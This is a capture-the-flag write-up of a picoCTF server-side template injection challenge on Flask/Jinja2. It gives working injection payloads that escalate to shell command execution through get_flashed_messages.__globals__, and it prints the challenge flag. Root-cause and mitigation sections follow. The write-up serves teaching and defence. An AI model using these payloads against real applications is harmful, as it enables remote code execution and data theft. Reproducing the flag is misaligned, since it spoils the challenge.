````markdown
# picoCTF â€“ Server-Side Template Injection (SSTI) â€“ Writeup

**Category:** Web Exploitation  
**Platform:** picoCTF (picoGym)  
**Challenge link:** [https://play.picoctf.org/practice/challenge/492](https://play.picoctf.org/practice/challenge/492)  
**Vulnerability:** Server-Side Template Injection (Jinja2 / Flask)  
**Flag:** `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390}`

---

## ğŸ“ Overview
The target web app reflects user input into a server-side template without proper sanitization.  
That allows Jinja2 expressions to be evaluated on the server (SSTI), which we can escalate to arbitrary command execution and read the flag file.

References:  
- [PortSwigger â€” Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)  
- [Flask docs â€” Message Flashing](https://flask.palletsprojects.com/en/stable/patterns/flashing/)

---

## ğŸ” Recon & Vulnerability Discovery

### 1) Probe for SSTI
Start with a math probe to see if the template engine evaluates input:

```jinja
{{7*7}}
````

**Result:** The page returns `49`.
This confirms server-side evaluation (Jinja2).

---

### 2) Enumerate exposed objects

Try common objects to gauge context:

```jinja
{{ config }}
{{ request }}
{{ request.args }}
{{ request.headers }}
```

**Observed:**

```
{{ config }} -> <Config {'DEBUG': False, ...}>
{{ request.args }} -> ImmutableMultiDict([])
{{ request.headers }} -> (headers dump)
```

This strongly suggests **Flask + Jinja2** with access to Flaskâ€™s request context.

---

## ğŸš€ Privilege Escalation to RCE

Pivot using the flashing mechanismâ€™s helper, which exposes Python modules:

```jinja
{{ get_flashed_messages.__globals__['os'].popen('ls').read() }}
```

**Result:**

```
__pycache__  app.py  flag  requirements.txt
```

âœ… Arbitrary command execution confirmed.

> **Why this works:**
> `get_flashed_messages` is a Flask helper available in the Jinja2 environment.
> The functionâ€™s `.__globals__` gives access to its moduleâ€™s namespace, including imported modules like `os`.
> From there, `os.popen()` executes shell commands.

---

## ğŸ¯ Exfiltrate the Flag

With RCE confirmed, read the `flag` file.

**Method A â€” via shell:**

```jinja
{{ get_flashed_messages.__globals__['os'].popen('cat flag').read() }}
```

**Method B â€” via Python I/O:**

```jinja
{{ get_flashed_messages.__globals__['__builtins__'].open('flag').read() }}
```

**Output:**

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390}
```

---

## âš ï¸ Root Cause

* The app renders **untrusted user input** with `render_template_string`.
* Jinja2 expressions (`{{ ... }}`) are evaluated inside the template context.
* Attackers can reach Python builtins/modules like `os`, enabling arbitrary command execution.

---

## ğŸ”’ Mitigations

* Never render raw user input directly into templates.
* Use context variables safely:

  ```python
  render_template("page.html", user=user)
  ```

  and in template: `{{ user|e }}` (escape input).
* Use sandboxed environments or limit exposed globals.
* Apply strict input validation and sanitization.
* Runtime defenses (e.g., WAFs) may block common SSTI payloads but are not substitutes for secure coding.

---

## ğŸ“Œ TL;DR

1. Test: `{{7*7}}` â†’ `49` (SSTI confirmed).
2. Enumerate: `{{ config }}`, `{{ request }}`.
3. Exploit: `{{ get_flashed_messages.__globals__['os'].popen('ls').read() }}`.
4. Read flag: `{{ ... 'cat flag' ... }}` â†’ `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390}`.

---

### ğŸ“š References

* [PortSwigger Web Security Academy â€” Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
* [Flask docs â€” Message Flashing](https://flask.palletsprojects.com/en/stable/patterns/flashing/)
* [OnSecurity â€” SSTI with Jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

```